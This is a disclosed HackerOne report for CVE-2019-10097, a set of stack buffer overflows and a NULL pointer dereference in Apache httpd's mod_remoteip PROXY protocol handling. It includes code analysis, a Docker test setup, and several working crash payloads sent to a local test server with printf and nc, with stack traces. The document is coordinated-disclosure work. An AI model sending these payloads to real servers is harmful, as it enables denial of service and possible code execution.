# mod_remoteip stack buffer overflow and NULL pointer dereference

## Report Details
- **Report ID**: 674540
- **URL**: https://hackerone.com/reports/674540
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-08-15T14:42:13.816Z
- **Disclosed**: 2019-11-07T20:21:12.527Z

## Reporter
- **Username**: ccppuu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Versions Affected:
httpd 2.4.32 to 2.4.39

Summary:
When mod_remoteip was configured to use a trusted intermediary proxy server using the "PROXY" protocol, a specially crafted PROXY v1 or PROXY v2 header could trigger a stack buffer overflow or NULL pointer deference. 

This was assigned CVE-2019-10097 and triaged by the Apache security team as a "Moderate" severity vulnerability, fixed in Apache 2.4.41: https://www.openwall.com/lists/oss-security/2019/08/15/5

The HTTPD maintainers and I collaborated on the fix: http://svn.apache.org/viewvc?view=revision&revision=1864526

Original report to Apache security team (with reproductions) follows:
--------------------------------------------------------------------------------------------------------------------------------

Apache httpd 2.4.31+ and newer when configured with `mod_remoteip` and
`RemoteIPProxyProtocol On` is affected by multiple vulnerabilities. The
vulnerabilities can be triggered remotely with malicious PROXY protocol request
input (both PROXY protocol versions 1 and 2).

The vulnerabilities identified in this report:

* HIGH: Stack overflow from unsafe memcpy handling PROXY v1/v2 messages
* HIGH: Stack overflow from unsafe strcpy handling PROXY v1 messages
* MED: Denial of service from null pointer dereference handling PROXY v2
  messages

These vulnerabilities also apply to the 3rd party `mod_proxy_protocol` module
from which the core HTTPD `mod_remoteip` module was derived.

# Reported by

Daniel McCarney - cpu@letsencrypt.org
Let's Encrypt / Internet Security Research Group (ISRG)

# Background

In a multi-tier architecture the server that terminates a client connection may
in turn initiate a new request to another server. For access control and logging
it's beneficial for the first server to be able to pass along information about
the original client request (e.g. source IP address and port) to the other
server(s).

As a replacement for ad-hoc HTTP headers (e.g. `X-Forwarded-For`) the HAProxy
project specified a protocol (confusingly) called PROXY[0]. There are two
versions specified:

* PROXY version 1 - a simple ASCII based protocol.
* PROXY version 2 - a more efficient binary protocol.

The Apache HTTPD project added support to the core `mod_remoteip` module[1] for
PROXY version 1 and version 2 in HTTPD version 2.4.31. It can be enabled
server-wide or per virtual host using the `RemoteIPProxyProtocol on`
configuration. Previously Apache HTTPD servers could add support for the PROXY
protocol with a 3rd party `mod_proxy_protocol`[2] module.

# Vulnerability Detail

Function names referenced in this section may be found in the source file
`modules/metadata/mod_remoteip.c`[3].

To aid in reproduction I've created a simple Dockerfile available here:

  https://gist.github.com/cpu/60365c1451bd531f79f5364f44f18f5c

And modified a stock `httpd.conf` to enable PROXY protocol by adding:

1. `RemoteIPProxyProtocol On`
2. `LoadModule remoteip_module modules/mod_remoteip.so`

The `httpd.conf` is available here:

  https://gist.github.com/cpu/a6b0edaacd9fdf8d978886d0a325d975

After downloading both simply run:

```
docker build -t test-apache2 .
docker run -dit --name test-apache2-app -p 6666:80 test-apache2
```

HTTPD logs are accessible with:

```
docker logs -f test-apache2-app
```

The provided proof of concept vulnerability triggers are now ready to be
delivered to `localhost:6666`.

## Stack overflow from unsafe memcpy handling PROXY v1 and V2 messages

In the `remoteip_input_filter` function the data read from the bucket brigade
carrying the attacker input (pointed to by `ptr`, of len `len`) is copied into
the `ctx->header` structure, at an offset of `ctx->rcvd` bytes using `memcpy`:

```
memcpy(ctx->header + ctx->rcvd, ptr, len);
```

There is no enforcement that the destination buffer is sized appropriately so
when `len` is larger than `sizeof(ctx->header)` a classic buffer overflow
occurs.

### Example reproduction

Any PROXY v1 request with a "PROXY " prefix, a trailing `\r\n` and sufficient
size will trigger this vulnerability.

```
printf "PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" | nc localhost 6666
```

Stack trace:
```
Thread 3 "httpd" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2e0b700 (LWP 17165)]
apr_brigade_destroy (b=0x6161616161616161) at buckets/apr_brigade.c:52
52          apr_pool_cleanup_kill(b->p, b, brigade_cleanup);
```

Any valid PROXY v2 request (e.g. supported version, cmd, protocol and address family) and sufficient size will also trigger this vulnerability.

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x21\x32\x08\x6f\x6faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc localhost 6666
```

Stack trace:
```
Thread 3 "httpd" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2e0b700 (LWP 17197)]
apr_brigade_destroy (b=0x6161616161616161) at buckets/apr_brigade.c:52
52          apr_pool_cleanup_kill(b->p, b, brigade_cleanup);
```

## Stack overflow from unsafe strcpy handling PROXY v1 messages

### Detail

After the `remoteip_input_filter` function has determined that received input is
PROXY v1 (with `remoteip_determine_version`) the raw PROXY header data context
is passed to `remoteip_process_v1_handler` to handle decoding the human readable
PROXY v1 message format.

A static sized buffer named `buf` is initialized on the stack with a capacity of
`sizeof(hdr->v1.line)`, resulting in a 108 byte buffer. Later, a `strcpy` is
used to copy from `hdr->v1.line` to `buf`. There is no check that the `strlen`
of `hdr->v1.line` is less than the capacity of `buf`, resulting in a trivial
buffer overflow.

```
/* parse in separate buffer so have the original for error messages */
strcpy(buf, hdr->v1.line);
```

### Example reproduction

Any PROXY v1 request with a "PROXY " prefix, a trailing `\r\n` and sufficient
size will trigger this vulnerabiltiy. Using requests that are too large will end
up triggering the more general `memcpy` vulnerability discussed previously.

```
printf "PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" | nc localhost 6666
```

Stacktrace:
```
*** buffer overflow detected ***: /usr/local/apache2/bin/httpd terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7ffff71927e5]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x5c)[0x7ffff723415c]
/lib/x86_64-linux-gnu/libc.so.6(+0x117160)[0x7ffff7232160]
/lib/x86_64-linux-gnu/libc.so.6(+0x1164b2)[0x7ffff72314b2]
/usr/local/apache2/modules/mod_remoteip.so(+0x39e3)[0x7ffff486e9e3]
/usr/local/apache2/bin/httpd(ap_rgetline_core+0xfa)[0x43843a]
/usr/local/apache2/bin/httpd(ap_read_request+0x2a6)[0x43b1e6]
/usr/local/apache2/bin/httpd[0x464b6d]
/usr/local/apache2/bin/httpd(ap_run_process_connection+0x40)[0x45beb0]
/usr/local/apache2/bin/httpd[0x470455]
/usr/local/apache2/bin/httpd[0x471428]
/lib/x86_64-linux-gnu/libpthread.so.0(+0x76ba)[0x7ffff74ec6ba]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d)[0x7ffff722241d]
```

## Denial of service from null pointer dereference handling PROXY v2

In the `remoteip_input_filter` function it's assumed that when control flow
reaches L1173 that the `done` variable is true and so the `conn_conf` has been
populated with the true `client_ip` and `client_addr` by the PROXY messages that
were processed to reach the done state. The `conn_conf->client_addr` field is
then dereferenced to log `conn_conf->client_addr->port`.

```
ap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f->c, APLOGNO(03511)
              "RemoteIPProxyProtocol: received valid PROXY header: %s:%hu",
              conn_conf->client_ip, conn_conf->client_addr->port);
```

Unfortunately there is a logic error in this assumption. The
`remoteip_process_v2_header` function returns `HDR_DONE`, triggering `done = 1`
in two conditions where the `conn_conf->client_addr` remains null, triggering
a null pointer dereference when `conn_conf->client_addr->port` is evaluated,
causing the worker thread to segfault.

The first condition this can occur is when the `hdr->v2.fam` indicating the
address family and protocol is unsupported:

```
    default:
        /* unsupported protocol, keep local connection address */
        return HDR_DONE;
```

The other condition this can occur is when the `hdr->v2.ver_cmd`'s lower order
bits are 0x00, indicating it is a LOCAL command.

```
   case 0x00: /* LOCAL command */
       /* keep local connection address for LOCAL */
       return HDR_DONE;
```

The comments in the LOCAL command case potentially indicate that there was an
assumption that the addresses were pre-populated and so HDR_DONE could be
returned without error. I believe this code/assumption were adopted from the
HAProxy PROXY protocol example code at the end of the specification document[1]
where the same `case 0x00` logic and comment can be found. In this example code
however the `sockaddr_storage` for `from` and `to` are said to have been
"already filled by accept()" and "getsockname()".

### Example reproduction

This bug can be triggered with a valid PROXY v2 message using the LOCAL command:

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x20\x11\x00\x00" | nc localhost 6666
```

Stack trace:
```
Thread 3 "httpd" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2e0b700 (LWP 17395)]
0x00007ffff486ebad in remoteip_input_filter (f=0x7fffec037690, bb_out=0x7fffdc003e58, mode=AP_MODE_GETLINE,.
    block=APR_BLOCK_READ, readbytes=0) at mod_remoteip.c:1248
    1248        ap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f->c, APLOGNO(03511)

```

It can also be triggered with a valid PROXY v2 message using the PROXY command
and an unsupported address family/protocol:

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x21\x00\x00\x00" | nc localhost 6666
```

Stack trace:
```
Thread 3 "httpd" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2e0b700 (LWP 17437)]
0x00007ffff486ebad in remoteip_input_filter (f=0x7fffec037690, bb_out=0x7fffdc003e58, mode=AP_MODE_GETLINE,.
    block=APR_BLOCK_READ, readbytes=0) at mod_remoteip.c:1248
    1248        ap_log_cerror(APLOG_MARK, APLOG_DEBUG, 0, f->c, APLOGNO(03511)
```

# Mitigations

The Apache `mod_remoteip` docs[1] strongly encourages care with what
intermediate hosts should be trusted to provide `mod_remoteip` inputs:

> It is critical to only enable this behavior from intermediate hosts (proxies,
> etc) which are trusted by this server, since it is trivial for the remote
> useragent to impersonate another useragent.

Administrators that restrict the hosts that can send requests to the
VirtualHost/Server with `RemoteIPPRoxyProtocol on` (e.g. through external
firewall policy/network controls) will restrict their exposure
to these vulnerabilities.

Unfortunately unlike the `RemoteIPHeader` directives it is *not* possible to
configure `RemoteIPProxyProtocol on` and whitelist intermediate IP addresses
(e.g. like `RemoteIPInternalProxyList`) within the Apache configuration. Thus
administrators must take action above and beyond their Apache configuration to
use this module safely and mitigate the reported vulnerabilities.

# Applicability to mod_proxy_protocol

The core Apache project `mod_remoteip` module's PROXY support was originally
adopted from a 3rd party module, `mod_proxy_protocol`[2]. All of the
vulnerabilities identified in this report are from code shared with the original
`mod_proxy_protocol` module. Users of this module with other HTTPD versions are
equally affected by these vulnerabilities.

# References

[0] https://httpd.apache.org/docs/2.4/mod/mod_remoteip.html
[1] https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt
[2] https://github.com/roadrunner2/mod-proxy-protocol
[3] https://github.com/apache/httpd/blob/8cfc6007670cf4bcc7129c197dda456e0d5de102/modules/metadata/mod_remoteip.c

## Impact

The classic stack overflows can lead to memory corruption and the potential for remote code execution.

Typically the PROXY protocol is used between security contexts: e.g. a front-end web server in a DMZ terminates HTTP/HTTPS and uses the PROXY protocol when forwarding the request to an application server in a different security context with firewall rules protecting access except from the front-end web server. Abusing the PROXY protocol would allow an attacker who has compromised the front-end web server to pivot through code execution on the application server via crafted PROXY request.

## Attachments
No attachments
